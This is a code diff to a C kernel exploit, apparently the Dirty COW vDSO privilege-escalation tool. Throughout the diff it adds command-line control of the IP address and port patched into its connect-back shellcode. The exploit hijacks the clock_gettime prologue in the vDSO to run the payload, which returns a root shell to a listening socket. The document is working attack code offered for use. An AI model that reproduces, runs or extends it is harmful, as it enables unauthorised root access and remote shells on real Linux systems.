@@ -31,10 +31,15 @@
 #define PAGE_SIZE 4096
 #endif
 
+#define PATTERN_IP		"\xde\xc0\xad\xde"
+#define PATTERN_PORT		"\x37\x13"
+#define PATTERN_PROLOGUE	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+
+#define PAYLOAD_IP		INADDR_LOOPBACK
+#define PAYLOAD_PORT		1234
+
 #define LOOP			0x10000
 #define VDSO_SIZE		(2 * PAGE_SIZE)
-#define CONNECT_BACK_PORT	1234
-#define PATCH			"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
 #define ARRAY_SIZE(arr)		(sizeof(arr) / sizeof(arr[0]))
 
 typedef unsigned int uint32_t;
@@ -175,14 +180,16 @@ static int patch_payload_helper(struct payload_patch *pp)
 }
 
 /*
- * A few bytes of the payload must be patched: prologue.
+ * A few bytes of the payload must be patched: prologue, ip, and port.
  */
-static int patch_payload(struct prologue *p)
+static int patch_payload(struct prologue *p, uint32_t ip, uint16_t port)
 {
 	int i;
 
 	struct payload_patch payload_patch[] = {
-		{ "prologue", PATCH, sizeof(PATCH)-1, p->opcodes, p->size },
+		{ "port", PATTERN_PORT, sizeof(PATTERN_PORT)-1, &port, sizeof(port) },
+		{ "ip", PATTERN_IP, sizeof(PATTERN_IP)-1, &ip, sizeof(ip) },
+		{ "prologue", PATTERN_PROLOGUE, sizeof(PATTERN_PROLOGUE)-1, p->opcodes, p->size },
 	};
 
 	for (i = 0; i < ARRAY_SIZE(payload_patch); i++) {
@@ -241,7 +248,7 @@ static int build_vdso_patch(void *vdso_addr, struct prologue *prologue)
 	}
 
 	/* patch #2: hijack clock_gettime prologue */
-	buf = malloc(sizeof(PATCH)-1);
+	buf = malloc(sizeof(PATTERN_PROLOGUE)-1);
 	if (buf == NULL) {
 		warn("malloc");
 		return -1;
@@ -249,7 +256,7 @@ static int build_vdso_patch(void *vdso_addr, struct prologue *prologue)
 
 	/* craft call to payload */
 	target = VDSO_SIZE - payload_len - clock_gettime_offset;
-	memset(buf, '\x90', sizeof(PATCH)-1);
+	memset(buf, '\x90', sizeof(PATTERN_PROLOGUE)-1);
 	buf[0] = '\xe8';
 	*(uint32_t *)&buf[1] = target - 5;
 
@@ -453,7 +460,7 @@ static int exploit(struct mem_arg *arg, bool do_patch)
 	return ret;
 }
 
-static int create_socket(void)
+static int create_socket(uint16_t port)
 {
 	struct sockaddr_in addr;
 	int enable, s;
@@ -470,10 +477,10 @@ static int create_socket(void)
 
 	addr.sin_family = AF_INET;
 	addr.sin_addr.s_addr = INADDR_ANY;
-	addr.sin_port = htons(CONNECT_BACK_PORT);
+	addr.sin_port = port;
 
 	if (bind(s, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
-		warn("failed to bind socket on port %d", CONNECT_BACK_PORT);
+		warn("failed to bind socket on port %d", ntohs(port));
 		close(s);
 		return -1;
 	}
@@ -590,11 +597,52 @@ static struct prologue *fingerprint_prologue(void *vdso_addr)
 	return NULL;
 }
 
+/*
+ * 1.2.3.4:1337
+ */
+static int parse_ip_port(char *str, uint32_t *ip, uint16_t *port)
+{
+	char *p;
+	int ret;
+
+	str = strdup(str);
+	if (str == NULL) {
+		warn("strdup");
+		return -1;
+	}
+
+	p = strchr(str, ':');
+	if (p != NULL && p[1] != '\x00') {
+		*p = '\x00';
+		*port = htons(atoi(p + 1));
+	}
+
+	ret = (inet_aton(str, (struct in_addr *)ip) == 1) ? 0 : -1;
+	if (ret == -1)
+		warn("inet_aton(%s)", str);
+
+	free(str);
+	return ret;
+}
+
 int main(int argc, char *argv[])
 {
 	struct prologue *prologue;
 	struct mem_arg arg;
+	uint16_t port;
+	uint32_t ip;
 	int s;
+
+	ip = htonl(PAYLOAD_IP);
+	port = htons(PAYLOAD_PORT);
+
+	if (argc > 1) {
+		if (parse_ip_port(argv[1], &ip, &port) != 0)
+			return EXIT_FAILURE;
+	}
+
+	fprintf(stderr, "[*] payload target: %s:%d\n",
+		inet_ntoa(*(struct in_addr *)&ip), ntohs(port));
 
 	arg.vdso_addr = get_vdso_addr();
 	if (arg.vdso_addr == NULL)
@@ -607,13 +655,13 @@ int main(int argc, char *argv[])
 		return EXIT_FAILURE;
 	}
 
-	if (patch_payload(prologue) == -1)
+	if (patch_payload(prologue, ip, port) == -1)
 		return EXIT_FAILURE;
 
 	if (build_vdso_patch(arg.vdso_addr, prologue) == -1)
 		return EXIT_FAILURE;
 
-	s = create_socket();
+	s = create_socket(port);
 	if (s == -1)
 		return EXIT_FAILURE;
 
